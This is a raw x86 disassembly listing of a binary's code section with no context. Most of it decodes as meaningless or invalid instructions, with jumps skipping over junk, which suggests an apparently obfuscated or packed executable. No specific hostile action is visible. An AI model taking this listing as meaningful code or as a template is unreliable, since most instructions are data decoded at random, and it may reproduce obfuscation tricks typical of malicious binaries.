  405221:	and    ecx,DWORD PTR [ebp+0x7db113b3]
  405227:	aas    
  405228:	mov    esp,ss
  40522a:	mov    ebx,0xa96daf33
  40522f:	push   esp
  405230:	cmp    DWORD PTR [ebp+0x70],0xffffffb4
  405234:	adc    BYTE PTR [edi+0x64],0x6e
  405238:	pop    ecx
  405239:	test   eax,0x81112ff1
  40523e:	jo     0x4052a5
  405240:	push   edi
  405241:	pop    ecx
  405242:	push   es
  405243:	fadd   QWORD PTR [esp+ebx*1]
  405246:	ss gs xor eax,0x53ed1869
  40524d:	ret    
  40524e:	push   esp
  40524f:	les    esi,FWORD PTR [ebp+0x40]
  405252:	(bad)
  405255:	out    dx,al
  405256:	xor    dh,dl
  405258:	sti    
  405259:	pop    ebx
  40525a:	pop    ecx
  40525b:	add    edi,esi
  40525d:	ret    
  40525e:	mov    cl,0x6a
  405260:	bound  eax,QWORD PTR [ebx-0x2]
  405263:	xchg   DWORD PTR [edi+ebp*1],ebx
  405266:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405267:	push   esi
  405268:	xchg   esi,eax
  405269:	xchg   DWORD PTR [edx+0x22],ebx
  40526c:	sti    
  40526d:	jns    0x405206
  40526f:	test   ecx,eax
  405271:	maskmovq mm6,(bad)
  405272:	div    DWORD PTR [ebp+0x481225b6]
  405278:	test   DWORD PTR [edi],0x21d269b
  40527e:	jo     0x40524f
  405280:	call   0x1ee34763
  405285:	lock mul DWORD PTR [ebx+0x581e422d]
  40528c:	jne    0x405226
  40528e:	dec    esi
  40528f:	dec    eax
  405290:	imul   edi,DWORD PTR [edx-0x73],0x5d7ccee
  405297:	jns    0x4052a9
  405299:	xchg   edx,eax
  40529a:	push   0xcb31fdd4
  40529f:	jnp    0x405238
  4052a1:	fnstenv ds:0x5744dc9d
  4052a7:	jne    0x40528e
  4052a9:	pop    ds
  4052aa:	or     cl,BYTE PTR [esi]
  4052ac:	add    BYTE PTR [ebx],dh
  4052ae:	gs jl  0x405309
  4052b1:	in     eax,0xe5
  4052b3:	add    al,0x85
  4052b5:	clc    
  4052b6:	test   BYTE PTR [edi],ch
  4052b8:	push   eax
  4052b9:	mov    bl,0x29
  4052bb:	shl    DWORD PTR [eax+0x9520bee],cl
  4052c1:	push   ecx
  4052c2:	fnstsw WORD PTR [eax]
  4052c4:	ret    0x165a
  4052c7:	mov    eax,ds:0x6f9bceaa
  4052cc:	jno    0x4052f4
  4052ce:	pop    ss
  4052cf:	shl    DWORD PTR [ebx],cl
  4052d1:	repnz add eax,ecx
  4052d4:	add    esi,ecx
  4052d6:	imul   eax,esi
  4052d9:	jmp    0x40559d
  4052de:	mov    eax,DWORD PTR [ebp+0xc]
  4052e1:	mov    eax,DWORD PTR [eax+0x78]
  4052e4:	mov    DWORD PTR [ebp+0xc],eax
  4052e7:	mov    eax,DWORD PTR [ebp-0x4]
  4052ea:	mov    esi,DWORD PTR [ebp-0x8]
  4052ed:	xor    eax,edx
  4052ef:	xor    esi,edx
  4052f1:	add    eax,ecx
  4052f3:	jmp    0x405577
  4052f8:	shl    DWORD PTR [ebx],0xe4
  4052fb:	add    al,0xe2
  4052fd:	ret    
  4052fe:	loope  0x4052e1
  405300:	and    esp,DWORD PTR [eax-0x28d8fef8]
  405306:	es rol esi,1
  405309:	sub    dh,BYTE PTR [eax+0x70]
  40530c:	fnstcw WORD PTR [esi+0x70]
  40530f:	jo     0x4052cc
  405311:	out    0xb3,al
  405313:	in     al,dx
  405314:	in     al,0x6e
  405316:	sbb    DWORD PTR [eax+0x384b77c7],eax
  40531c:	shr    BYTE PTR [eax-0x70],0x91
  405320:	test   edi,edx
  405322:	or     cl,ch
  405324:	out    0x58,al
  405326:	and    al,0xd1
  405328:	mov    esi,0x46386c19
  40532d:	outs   dx,DWORD PTR ds:[esi]
  40532e:	xchg   DWORD PTR [esi-0x50],eax
  405331:	jmp    0x4052da
  405333:	fsubr  QWORD PTR [edx-0x36e8292f]
  405339:	call   0x5fb4:0xac084d8
  405340:	dec    ecx
  405341:	mul    DWORD PTR [esi+ebp*8+0x2e053a82]
  405348:	(bad)  
  405349:	mov    ch,0x29
  40534b:	fimul  WORD PTR [ebx+0x44a378ee]
  405351:	dec    ecx
  405352:	mov    ds:0x37fdef9e,al
  405357:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405358:	ja     0x4053d5
  40535a:	mov    cl,0x6a
  40535c:	adc    eax,0xd4acf619
  405361:	adc    eax,0x50e2d228
  405366:	xor    esi,DWORD PTR [esi+0x52]
  405369:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40536a:	push   esi
  40536b:	jmp    0x86e9c8c4
  405370:	or     al,0x2
  405372:	in     eax,dx
  405373:	jmp    0x80d6:0x3c0836c5
  40537a:	xchg   esi,eax
  40537b:	addr16 jns 0x40530c
  40537e:	lea    edi,[ecx-0x3ec3cd9a]
  405384:	loope  0x405373
  405386:	add    ebx,DWORD PTR ds:[edx+eax*1-0x18ace095]
  40538e:	xchg   ebx,eax
  40538f:	sub    DWORD PTR [ebx],eax
  405391:	xchg   esp,eax
  405392:	mov    DWORD PTR [edx+0x2e6045b8],eax
  405398:	mov    edi,0x43385696
  40539d:	mov    dl,BYTE PTR [ebx]
  40539f:	mov    esp,0xb310884f
  4053a4:	(bad)  
  4053a8:	xchg   esi,eax
  4053a9:	mov    esi,0xaa2e7695
  4053ae:	outs   dx,DWORD PTR ds:[esi]
  4053af:	or     al,0x1
  4053b1:	mov    dl,0xbc
  4053b3:	or     al,0x33
  4053b5:	sub    bl,BYTE PTR [ebx-0x30]
  4053b8:	outs   dx,BYTE PTR ds:[esi]
  4053b9:	ja     0x405404
  4053bb:	or     DWORD PTR [edi],edx
  4053bd:	out    0x22,eax
  4053bf:	push   ss
  4053c0:	and    eax,0x41278830
  4053c5:	xchg   BYTE PTR [edx-0x5b],al
  4053c8:	xor    ecx,DWORD PTR [edx-0x2cb3b798]
  4053ce:	(bad)  
  4053cf:	out    0x8c,eax
  4053d1:	add    dh,BYTE PTR [ecx+0x11289fd5]
  4053d7:	(bad)  
  4053d8:	mov    ebp,0xa3fabf65
  4053dd:	xchg   DWORD PTR [ebx-0x7f7add9f],ecx
  4053e3:	sub    BYTE PTR [ebx-0x71e64b37],0x22
  4053ea:	push   cs
  4053eb:	in     eax,0xe9
  4053ed:	and    eax,0x78b7e5df
  4053f2:	pusha  
  4053f3:	pop    esi
  4053f4:	sbb    eax,0x54d7358c
  4053f9:	add    al,0xb8
  4053fb:	adc    al,0x1d
  4053fd:	test   DWORD PTR [ebp-0x78],ebx
  405400:	jecxz  0x405410
  405402:	fmul   DWORD PTR [esi+0x34]
  405405:	adc    eax,0xd371167a
  40540a:	aam    0xe4
  40540c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40540d:	or     BYTE PTR [eax+0x59],dl
  405410:	jp     0x4053c3
  405412:	(bad)  
  405413:	and    BYTE PTR [eax],dh
  405415:	xlat   BYTE PTR ds:[ebx]
  405416:	arpl   WORD PTR [ebx+ebp*2-0x72],dx
  40541a:	mov    dl,0x84
  40541c:	nop
  40541d:	dec    edx
  40541e:	xor    eax,DWORD PTR [ebp+0x73385df8]
  405424:	add    eax,0x627aa199
  405429:	in     al,dx
  40542a:	or     BYTE PTR [eax+0xbd8cab],dh
  405430:	das    
  405431:	jp     0x4053d8
  405433:	jne    0x4053df
  405435:	xchg   BYTE PTR ds:0x510a903f,dh
  40543b:	call   0xf1aff6f5
  405440:	cmp    BYTE PTR [ebp-0x11db27ca],dl
  405446:	xchg   ebp,eax
  405447:	mov    eax,ds:0x5142717
  40544c:	imul   edi,DWORD PTR [eax+0x4a],0x40
  405450:	push   ebp
  405451:	lock das 
  405453:	div    DWORD PTR [esi+0x28]
  405456:	mov    dl,0x6d
  405458:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405459:	or     eax,0x74e8c19
  40545e:	pop    edi
  40545f:	int    0x49
  405461:	(bad)  
  405463:	jns    0x405447
  405465:	repnz loopne 0x405417
  405468:	(bad)  
  40546a:	mov    esp,esp
  40546c:	mov    BYTE PTR [esi-0x2838307b],bh
  405472:	mov    esp,0x97f50d0a
  405477:	retf   0x1544
  40547a:	add    BYTE PTR [edx+ecx*2+0x36],ch
  40547e:	iret   
  40547f:	mov    ebp,0xc3632009
  405484:	dec    esi
  405485:	xor    ebx,DWORD PTR [ebx+0x5c]
  405488:	out    dx,eax
  405489:	outs   dx,DWORD PTR ds:[esi]
  40548a:	cwde   
  40548b:	mov    ebp,ds
  40548d:	push   esi
  40548e:	lds    edx,FWORD PTR ds:0xcc086db
  405494:	sbb    bh,BYTE PTR [ecx+0x616fbb5c]
  40549a:	cwde   
  40549b:	out    0xb7,al
  40549d:	bswap  edi
  40549f:	sar    DWORD PTR [ebx-0x5f],cl
  4054a2:	fstp   QWORD PTR [ebx+edi*8]
  4054a5:	mov    esp,0xd86cfeb2
  4054aa:	xor    DWORD PTR [ebx-0x596a0ab0],ecx
  4054b0:	adc    DWORD PTR [ebp-0x2f8f392],ebx
  4054b6:	call   0xaa20ff7b
  4054bb:	cmp    bh,dh
  4054bd:	xor    DWORD PTR [ebx-0x1bc0429c],eax
  4054c3:	test   al,0x67
  4054c5:	js     0x405466
  4054c7:	mov    al,BYTE PTR [edi-0x6548f78d]
  4054cd:	sbb    eax,0xe7095cb3
  4054d2:	mov    dh,BYTE PTR [eiz*8+0x120c68d7]
  4054d9:	aam    0xe4
  4054db:	xor    esi,DWORD PTR gs:[edx+0x3406977a]
  4054e2:	ret    
  4054e3:	push   cs
  4054e4:	sub    edx,DWORD PTR [ebp-0x1ac1ba9a]
  4054ea:	dec    eax
  4054eb:	jg     0x4054a0
  4054ed:	call   0x9125:0x801a8bd6
  4054f4:	mov    ds:0xc70ca597,eax
  4054f9:	or     eax,0x8aa374c7
  4054fe:	gs stos BYTE PTR es:[edi],al
  405500:	jp     0x40550b
  405502:	scas   al,BYTE PTR es:[edi]
  405503:	dec    ebx
  405504:	or     ebx,ebp
  405506:	rcl    BYTE PTR ds:0x8ecad605,1
  40550c:	jnp    0x4054a4
  40550e:	ds ret 0xbf0a
  405512:	adc    BYTE PTR [edx+0x47],cl
  405515:	xchg   edx,eax
  405516:	std    
  405517:	lahf   
  405518:	jle    0x4054bb
  40551a:	cld    
  40551b:	rcr    DWORD PTR [edx+0x4c349371],1
  405521:	sub    al,0x9d
  405523:	js     0x4054ca
  405525:	dec    eax
  405526:	adc    BYTE PTR [ebp-0x55b45c69],ch
  40552c:	xchg   edx,eax
  40552d:	sbb    DWORD PTR [edx-0x2b],0x6
  405531:	jmp    0x9533834f
  405536:	cmp    DWORD PTR [edx],esp
  405538:	mov    cl,0xe7
  40553a:	pop    ebx
  40553b:	and    esi,eax
  40553d:	cmp    al,0xe7
  40553f:	out    dx,al
  405540:	loope  0x4054fa
  405542:	jmp    0x405560
  405544:	(bad)  
  405546:	sar    BYTE PTR [edx+0x41],cl
  405549:	test   BYTE PTR [ebp+0x55bbfc6e],al
  40554f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405550:	fnstenv [esi+0x46]
  405553:	dec    eax
  405554:	(bad)  
  405555:	add    BYTE PTR ds:0x1c0e10c5,ah
  40555b:	mov    bl,0xce
  40555d:	imul   ebx,DWORD PTR [edx+edi*4-0x7],0xffffffdc
  405562:	jb     0x4054f7
  405564:	int    0x21
  405566:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405567:	sbb    eax,0xb7f71850
  40556c:	pop    ss
  40556d:	test   al,0x31
  40556f:	jae    0x405526
  405571:	mov    dl,0xfa
  405573:	mov    bh,0x5d
  405575:	xor    eax,0xff10388
  40557a:	scas   eax,DWORD PTR es:[edi]
  40557b:	(bad)  
  40557c:	mov    esi,DWORD PTR [ebp+0xc]
  40557f:	cmp    esi,eax
  405581:	mov    eax,DWORD PTR [ebp-0x4]
  405584:	je     0x405047
  40558a:	xor    eax,edx
  40558c:	add    eax,ecx
  40558e:	mov    ecx,DWORD PTR [ebp+0xc]
  405591:	imul   eax,ecx
  405594:	add    eax,DWORD PTR [ebp+0x8]
  405597:	mov    DWORD PTR [ebp+0xc],eax
  40559a:	mov    eax,DWORD PTR [ebp+0xc]
  40559d:	pop    esi
  40559e:	leave  
  40559f:	ret    0x8
  4055a2:	push   ebp
  4055a3:	mov    ebp,esp
  4055a5:	push   ecx
  4055a6:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  4055ad:	mov    eax,DWORD PTR [ebp-0x4]
  4055b0:	mov    edx,DWORD PTR [ebp+0x10]
  4055b3:	mov    ecx,0x7510855
  4055b8:	adc    DWORD PTR ds:0x434321,0x21da
  4055c2:	xor    eax,ecx
  4055c4:	add    eax,0x32729c
  4055c9:	and    DWORD PTR ds:0x4325fc,0x2b83
  4055d3:	mov    DWORD PTR [edx],eax
  4055d5:	mov    eax,ds:0x434339
  4055da:	mov    edx,DWORD PTR ds:0x43435d
  4055e0:	sub    eax,edx
  4055e2:	xor    eax,DWORD PTR [eax+edx*1]
  4055e5:	mov    eax,DWORD PTR [ebp+0xc]
  4055e8:	dec    edx
  4055e9:	xor    eax,ecx
  4055eb:	dec    edx
  4055ec:	jmp    0x405755
  4055f1:	loope  0x4055fe
  4055f3:	xchg   edi,eax
  4055f4:	fdiv   DWORD PTR [ebp+0x64]
  4055f7:	jno    0x405602
  4055f9:	add    DWORD PTR [edi-0x74],0xa072cd84
  405600:	jne    0x4055b1
  405602:	sub    BYTE PTR [eax+0x70],dh
  405605:	les    edi,FWORD PTR [edi+0x70]
  405608:	jo     0x405681
  40560a:	sbb    ch,BYTE PTR ds:0x7e4379ec
  405610:	xchg   ecx,eax
  405611:	push   eax
  405612:	pop    esi
  405613:	mov    dl,0xe7
  405615:	dec    ebx
  405616:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405617:	(bad)  
  405618:	int    0xf5
  40561a:	cmp    esi,ebx
  40561c:	rol    bl,0x82
  40561f:	sub    esp,edx
  405621:	cmp    esi,DWORD PTR [ecx]
  405623:	cmp    eax,0x3f2588d3
  405628:	shl    esi,0xc6
  40562b:	int    0xd8
  40562d:	and    edx,esi
  40562f:	test   al,0x44
  405631:	cmc    
  405632:	aas    
  405633:	nop
  405634:	ss rcl dl,1
  405637:	jmp    0x4055cb
  405639:	shl    BYTE PTR [esi-0x47],1
  40563c:	test   DWORD PTR gs:[ebx-0x35],0xbb848612
  405644:	jl     0x4056be
  405646:	lock jmp 0x392cfc61
  40564c:	mov    ebp,0x1de38271
  405651:	push   eax
  405652:	mov    eax,ds:0xfe752803
  405657:	aas    
  405658:	sub    DWORD PTR [ebx+0x3d],esi
  40565b:	push   es
  40565c:	mov    al,0xde
  40565e:	popa   
  40565f:	rol    cl,cl
  405661:	cmp    bh,BYTE PTR [edi]
  405663:	or     eax,0xa8758edb
  405668:	fsub   DWORD PTR [esi-0x17b1bb4e]
  40566e:	pop    esp
  40566f:	sbb    ebp,DWORD PTR [eax]
  405671:	sbb    edi,esi
  405673:	cdq    
  405674:	pop    ss
  405675:	xchg   esp,eax
  405676:	aam    0xdb
  405678:	js     0x40568c
  40567a:	popa   
  40567b:	cwde   
  40567c:	(bad)  
  40567d:	fxtract 
  40567f:	and    edi,DWORD PTR [edi-0x7d]
  405682:	jb     0x405695
  405684:	cmp    al,0x91
  405686:	jmp    0x4056f4
  405688:	rcr    ecx,1
  40568a:	inc    ebx
  40568b:	int    0x58
  40568d:	cmp    DWORD PTR [edi-0x7771f4e0],edx
  405693:	pop    edi
  405694:	das    
  405695:	loop   0x40563e
  405697:	std    
  405698:	popa   
  405699:	pextrw ebp,(bad),0xc5
  40569b:	scas   eax,DWORD PTR es:[edi]
  40569c:	in     eax,dx
  40569d:	call   0x83be:0xceb9eaf3
  4056a4:	call   0x93489336
  4056a9:	mov    ebx,0xe4904af0
  4056ae:	rol    BYTE PTR [eax+0x41242432],cl
  4056b4:	cmp    esi,ecx
  4056b6:	int    0xdc
  4056b8:	lahf   
  4056b9:	jae    0x4056ff
  4056bb:	xor    eax,0x74910600
  4056c0:	leave  
  4056c1:	xchg   ebp,eax
  4056c2:	pop    esi
  4056c3:	jmp    0x565:0x49eb9b41
  4056ca:	aas    
  4056cb:	dec    ecx
  4056cc:	mov    dl,ah
  4056ce:	in     eax,dx
  4056cf:	test   ebx,edx
  4056d1:	inc    ebp
  4056d2:	inc    ebp
  4056d3:	stos   DWORD PTR es:[edi],eax
  4056d4:	sub    BYTE PTR [ebx],cl
  4056d6:	jne    0x40572b
  4056d8:	mov    bl,al
  4056da:	call   0x8514:0x111584a0
  4056e1:	inc    ecx
  4056e2:	mov    edx,0x3849bd6f
  4056e7:	jmp    0x7d60:0xb6ba9f26
  4056ee:	out    0xa7,al
  4056f0:	sbb    eax,0xc621e345
  4056f5:	(bad)  [esi+eiz*2-0x70]
  4056f9:	push   ds
  4056fa:	push   0xffffffd9
  4056fc:	aam    0xbb
  4056fe:	sub    eax,0xc84c63a2
  405703:	jb     0x405778
  405705:	xor    dh,BYTE PTR [edi]
  405707:	sub    eax,DWORD PTR [eax-0x6d]
  40570a:	jg     0x405724
  40570c:	mul    DWORD PTR [esi]
  40570e:	dec    eax
  40570f:	pop    esp
  405710:	pop    ss
  405711:	retf   0x41f8
  405714:	adc    ebp,DWORD PTR [esi]
  405716:	cmp    al,0xda
  405718:	adc    ch,BYTE PTR [eax]
  40571a:	mov    edx,0x77e6059
  40571f:	addr16 push ds
  405721:	fisub  DWORD PTR [edi+0x51c1489c]
  405727:	fbld   TBYTE PTR [ecx+0x34]
  40572a:	mov    ecx,0xd09c4fef
  40572f:	xchg   ecx,eax
  405730:	sahf   
  405731:	pop    ds
  405732:	sbb    al,0xe4
  405734:	ss sub eax,0xbb4bda56
  40573a:	rcl    DWORD PTR [ecx+0x6669f88a],1
  405740:	jae    0x40575d
  405742:	je     0x4056d1
  405744:	rol    DWORD PTR [eax+0x3425cccd],1
  40574a:	cli    
  40574b:	inc    ebp
  40574c:	addr16 in al,0x42
  40574f:	out    dx,al
  405750:	sbb    dl,dh
  405752:	test   eax,0x8b56259c
  405757:	jne    0x405769
  405759:	and    DWORD PTR ds:0x43426a,0x0
  405763:	mov    edx,DWORD PTR ds:0x43426a
  405769:	inc    edx
  40576a:	mov    DWORD PTR ds:0x43426a,edx
  405770:	cmp    DWORD PTR ds:0x43426a,0x22
  405777:	jne    0x405789
  40577d:	push   DWORD PTR [ebp-0xc]
  405780:	push   DWORD PTR [ebp-0x24]
  405783:	call   DWORD PTR ds:0x4328c2
  405789:	cmp    DWORD PTR ds:0x43426a,0x1c
  405790:	jb     0x405763
  405796:	mov    edx,0x32729c
  40579b:	adc    DWORD PTR ds:0x432cbe,0x43428a
  4057a5:	add    eax,edx
  4057a7:	mov    DWORD PTR [esi+0x4],eax
  4057aa:	movzx  eax,BYTE PTR ds:0x4325f4
  4057b1:	and    eax,DWORD PTR ds:0x43429a
  4057b7:	mov    ds:0x4325f4,eax
  4057bc:	mov    eax,DWORD PTR [ebp+0x14]
  4057bf:	mov    DWORD PTR ds:0x43427e,0x718d
  4057c9:	mov    esi,DWORD PTR [ebp+0x10]
  4057cc:	xor    DWORD PTR ds:0x432604,0x2330
  4057d6:	mov    DWORD PTR [esi+0x8],eax
  4057d9:	mov    eax,DWORD PTR [ebp+0x18]
  4057dc:	mov    esi,DWORD PTR [ebp+0x10]
  4057df:	mov    DWORD PTR [esi+0xc],eax
  4057e2:	mov    eax,DWORD PTR [ebp+0x1c]
  4057e5:	mov    esi,DWORD PTR [ebp+0x10]
  4057e8:	mov    DWORD PTR [esi+0x10],eax
  4057eb:	mov    eax,eax
  4057ed:	jmp    0x405956
  4057f2:	hlt    
  4057f3:	and    BYTE PTR [ecx],bl
  4057f5:	arpl   cx,sp
  4057f7:	jno    0x40586b
  4057f9:	scas   eax,DWORD PTR es:[edi]
  4057fa:	mov    al,ds:0x8519e0f
  4057ff:	cmc    
  405800:	daa    
  405801:	inc    esi
  405802:	jae    0x40583b
  405804:	jo     0x405876
  405806:	les    edi,FWORD PTR [edi+0x70]
  405809:	jo     0x405875
  40580b:	(bad)  
  40580c:	push   ebp
  40580d:	inc    esi
  40580e:	push   ss
  40580f:	pushf  
  405810:	loop   0x4057ed
  405812:	xchg   ebp,eax
  405813:	ds gs sbb eax,0xd788e9d0
  40581a:	jl     0x40584e
  40581c:	jo     0x4057dc
  40581e:	lahf   
  40581f:	dec    ebx
  405820:	xchg   esp,eax
  405821:	push   ecx
  405822:	mov    cl,0x62
  405824:	dec    esi
  405825:	inc    ebx
  405826:	mov    ch,0xf6
  405828:	aad    0xe0
  40582a:	add    al,0xd1
  40582c:	xchg   ebx,eax
  40582d:	and    BYTE PTR [eax+edi*4+0x7ddfa64c],dh
  405834:	mov    ch,0x5d
  405836:	inc    esi
  405837:	jo     0x40582f
  405839:	stc    
  40583a:	int3   
  40583b:	adc    eax,0x42d94e9e
  405840:	mov    dl,0x10
  405842:	setno  BYTE PTR [edx+0x3]
  405846:	sbb    al,0xfe
  405848:	ret    
  405849:	mov    esp,0x8a8f0fd2
  40584e:	loopne 0x4058ae
  405850:	nop
  405851:	xchg   ecx,eax
  405852:	push   eax
  405853:	xor    BYTE PTR [eax+0x210a8e0e],bl
  405859:	or     eax,0x64c04a7c
  40585e:	hlt    
  40585f:	pop    esi
  405860:	add    ecx,ebp
  405862:	sar    ebx,1
  405864:	mov    eax,0x1534185
  405869:	cwde   
  40586a:	push   edi
  40586b:	xchg   edx,eax
  40586c:	ret    
  40586d:	dec    edi
  40586e:	jae    0x405819
  405870:	int    0xb2
  405872:	leave  
  405873:	js     0x40587b
  405875:	mov    al,0xb1
  405877:	xor    DWORD PTR [ebp+0x5c],edx
  40587a:	xlat   BYTE PTR ds:[ebx]
  40587b:	jno    0x40588f
  40587d:	shr    BYTE PTR [edx],1
  40587f:	pop    ds
  405880:	lods   eax,DWORD PTR ds:[esi]
  405881:	pand   mm1,QWORD PTR [edx]
  405884:	cli    
  405885:	sub    DWORD PTR [edi-0x39],ebx
  405888:	sbb    ecx,ebx
  40588a:	bswap  edx
  40588c:	ficom  WORD PTR [ebx]
  40588e:	fcom   QWORD PTR [eax]
  405890:	add    bl,dh
  405892:	push   edi
  405893:	aas    
  405894:	xchg   esi,eax
  405895:	cmp    eax,0xb58750bf
  40589a:	dec    ecx
  40589b:	mov    ah,0xee
  40589d:	das    
  40589e:	retf   0xbb85
  4058a1:	xchg   BYTE PTR [eax+0x1b],bl
  4058a4:	or     al,0x6d
  4058a6:	xor    bh,BYTE PTR [edi-0x9]
  4058a9:	pop    ebp
  4058aa:	mov    ds:0xc3b1f58d,al
  4058af:	and    DWORD PTR [edx+0x93e5a90],ebx
  4058b5:	bound  ebx,QWORD PTR [edx]
  4058b7:	cld    
  4058b8:	mov    edi,0xe1ac53f6
  4058bd:	xor    DWORD PTR [ebp+0x5e],esi
  4058c0:	inc    eax
  4058c1:	(bad)  
  4058c2:	or     al,0x83
  4058c4:	jmp    0xea69a8b8
  4058c9:	lea    ebx,[ebx-0x1]
  4058cc:	icebp  
  4058cd:	xor    DWORD PTR [edi+0x7654d782],edi
  4058d3:	pusha  
  4058d4:	aad    0xe1
  4058d6:	imul   eax,DWORD PTR [ebp-0x54],0xffffff90
  4058da:	jns    0x4058b2
  4058dc:	cmp    al,0xd0
  4058de:	fisttp QWORD PTR [edx+eiz*1-0x5177c9d0]
  4058e5:	in     eax,0x79
  4058e7:	fxch   st(3)
  4058e9:	xlat   BYTE PTR ds:[ebx]
  4058ea:	icebp  
  4058eb:	(bad)  
  4058ec:	mov    al,0x75
  4058ee:	test   dl,dl
  4058f0:	push   eax
  4058f1:	mov    ah,0xa9
  4058f3:	fistp  DWORD PTR [edx+0x7]
  4058f6:	add    DWORD PTR [eax+0x3be9124f],eax
  4058fc:	test   al,0xbd
  4058fe:	test   BYTE PTR [edx+ebp*2+0x18],ch
  405902:	sub    al,0x86
  405904:	mov    ds:0xb0ab8b89,al
  405909:	ss outs dx,DWORD PTR ds:[esi]
  40590c:	stos   BYTE PTR es:[edi],al
  40590d:	adc    edx,DWORD PTR [eax-0x4b422f06]
  405913:	mov    edi,0x87dad082
  405918:	pop    ds
  405919:	out    0x6f,eax
  40591b:	and    esi,DWORD PTR [ebx+0x5b]
  40591e:	and    DWORD PTR ds:0x23d88c5b,esp
  405924:	icebp  
  405925:	jno    0x405988
  405927:	rcr    BYTE PTR [edi-0xe],cl
  40592a:	mov    ?,WORD PTR [edx+0x54c4f089]
  405930:	add    BYTE PTR [ecx],al
  405932:	fcom   DWORD PTR [esi+eax*1]
  405935:	mov    esp,0xf9733114
  40593a:	add    esp,edx
  40593c:	mov    edi,0xc6ed3590
  405941:	pop    edx
  405942:	test   al,0x3c
  405944:	add    BYTE PTR [ecx],al
  405946:	add    BYTE PTR [ebx-0x3d97a5f8],0xdf
  40594d:	xchg   edx,ebp
  40594f:	rcr    DWORD PTR [edx+eiz*2],cl
  405952:	mov    DWORD PTR [edx+0x458b51dc],ebp
  405958:	or     BYTE PTR [ebx],dh
  40595a:	rol    DWORD PTR [ebx],0xc2
  40595d:	pop    esi
  40595e:	leave  
  40595f:	ret    0x18
  405962:	push   ebp
  405963:	mov    ebp,esp
  405965:	mov    eax,DWORD PTR [ebp+0xc]
  405968:	xor    edx,edx
  40596a:	jmp    0x405ad3
  40596f:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  405971:	sub    esi,DWORD PTR [esi+0x7161b2eb]
  405977:	mov    ah,0xc8
  405979:	mov    esi,0x30aa6f11
  40597e:	or     eax,0x707035c7
  405983:	les    edi,FWORD PTR [edi+0x70]
  405986:	jo     0x4059d6
  405988:	(bad)  
  405989:	mov    ds:0xcc0357f1,al
  40598e:	test   eax,0xc84170cd
  405993:	and    al,0xb2
  405995:	xor    al,0xf7
  405997:	xchg   esi,eax
  405998:	in     al,0x5e
  40599a:	cmp    DWORD PTR [eax],esp
  40599c:	mov    cl,0x37
  40599e:	pop    ecx
  40599f:	mov    esp,0x4c69f16a
  4059a4:	dec    eax
  4059a5:	out    dx,al
  4059a6:	jnp    0x4059a8
  4059a8:	and    al,0xf8
  4059aa:	stos   BYTE PTR es:[edi],al
  4059ab:	icebp  
  4059ac:	arpl   WORD PTR [ebx],sp
  4059ae:	mov    eax,0xf55cabe4
  4059b3:	(bad)  
  4059b4:	jp     0x4059ac
  4059b6:	outs   dx,BYTE PTR ds:[esi]
  4059b7:	or     BYTE PTR [esi-0x6a1758f5],ah
  4059bd:	or     eax,0xf1c69473
  4059c2:	retf   
  4059c3:	lock mov bl,0x30
  4059c6:	ja     0x4059b8
  4059c8:	dec    eax
  4059c9:	es jb  0x40595a
  4059cc:	not    BYTE PTR [edx]
  4059ce:	add    al,0xd7
  4059d0:	and    BYTE PTR [esi-0x4de81d88],al
  4059d6:	xchg   BYTE PTR [edx],bh
  4059d8:	mov    dl,0x44
  4059da:	pop    ecx
  4059db:	lock leave 
  4059dd:	jg     0x40596f
  4059df:	jg     0x405a02
  4059e1:	jbe    0x405965
  4059e3:	int3   
  4059e4:	inc    ebx
  4059e5:	adc    cl,BYTE PTR [esi+0x2c980152]
  4059eb:	ret    
  4059ec:	clc    
  4059ed:	enter  0x6763,0x2d
  4059f1:	leave  
  4059f2:	mov    DWORD PTR [ebp+0x4f2434b4],ebp
  4059f8:	mov    ecx,0xe7b41480
  4059fd:	lahf   
  4059fe:	fcmovnu st,st(1)
  405a00:	ds in  al,dx
  405a02:	adc    ecx,ebx
  405a04:	mov    DWORD PTR [esi],esp
  405a06:	xchg   ch,bl
  405a08:	dec    ecx
  405a09:	inc    esp
  405a0a:	jle    0x4059e9
  405a0c:	dec    eax
  405a0d:	add    DWORD PTR [ecx+0x4a2f5d3c],esp
  405a13:	mov    ss,edx
  405a15:	ficom  DWORD PTR [esi*8-0x71102ffe]
  405a1c:	xlat   BYTE PTR ds:[ebx]
  405a1d:	pop    DWORD PTR [esi+0x27]
  405a20:	sub    DWORD PTR [edx],0x638c4e6c
  405a26:	pusha  
  405a27:	aam    0x7a
  405a29:	push   ebp
  405a2a:	popf   
  405a2b:	mov    ebx,0xce3957b4
  405a30:	inc    edx
  405a31:	push   es
  405a32:	ret    
  405a33:	inc    ebx
  405a34:	jp     0x405a38
  405a36:	or     BYTE PTR [esi+0x79],dl
  405a39:	jne    0x4059d5
  405a3b:	inc    ebx
  405a3c:	sbb    esi,ebp
  405a3e:	and    eax,0x66a67b10
  405a43:	inc    ebp
  405a44:	and    ecx,DWORD PTR [edi]
  405a46:	fs mov dl,0x54
  405a49:	lahf   
  405a4a:	data16 stc 
  405a4c:	ret    
  405a4d:	loop   0x4059d4
  405a4f:	mov    ss,WORD PTR [edx-0x470cd221]
  405a55:	(bad)  
  405a56:	shl    DWORD PTR [edi],1
  405a58:	mov    WORD PTR [ebx],ds
  405a5a:	dec    ebp
  405a5b:	adc    ecx,edi
  405a5d:	xlat   BYTE PTR ds:[ebx]
  405a5e:	sub    ah,bh
  405a60:	lock push ds
  405a62:	lock gs scas ax,WORD PTR es:[edi]
  405a66:	repnz push esp
  405a68:	cmovp  edx,edi
  405a6b:	fild   QWORD PTR [esi-0x52]
  405a6e:	js     0x405a94
  405a70:	pop    esp
  405a71:	aam    0x57
  405a73:	pop    es
  405a74:	push   0x25a4e34
  405a79:	ds push es
  405a7b:	cld    
  405a7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405a7d:	mov    BYTE PTR [ebp+edx*4+0x5d],ch
  405a81:	jg     0x405a3e
  405a83:	in     al,dx
  405a84:	add    bh,BYTE PTR [ecx-0x69baeca0]
